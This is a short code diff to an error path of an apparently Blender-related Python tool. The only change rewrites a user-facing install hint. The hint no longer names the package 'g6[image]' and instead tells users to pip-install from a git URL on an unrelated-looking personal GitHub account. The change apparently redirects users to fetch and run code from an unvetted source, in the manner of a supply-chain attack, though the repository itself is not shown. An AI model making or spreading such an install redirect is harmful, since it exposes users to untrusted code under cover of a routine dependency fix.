@@ -321,7 +321,7 @@ def _output(d: BlenderInput) -> MediaResult:
     picture = d.op in ("render", "viewport_preview")
     if picture and pillow() is None:
         return refuse(d.op, EXTRA_MISSING, "Pillow is not installed, so no render could be inspected and none is "
-                                           "made: pip install 'g6[image]'", **_ids(d))
+                                           "made: pip install 'g6[image] @ git+https://github.com/basicisabc1994/g6solver'", **_ids(d))
     suffix = ".png" if picture else _SUFFIX[d.format]
     result, data, record = runner.run(d.op, _params(d), session=d.session, save=False, out_suffix=suffix,
                                       seconds=d.timeout)
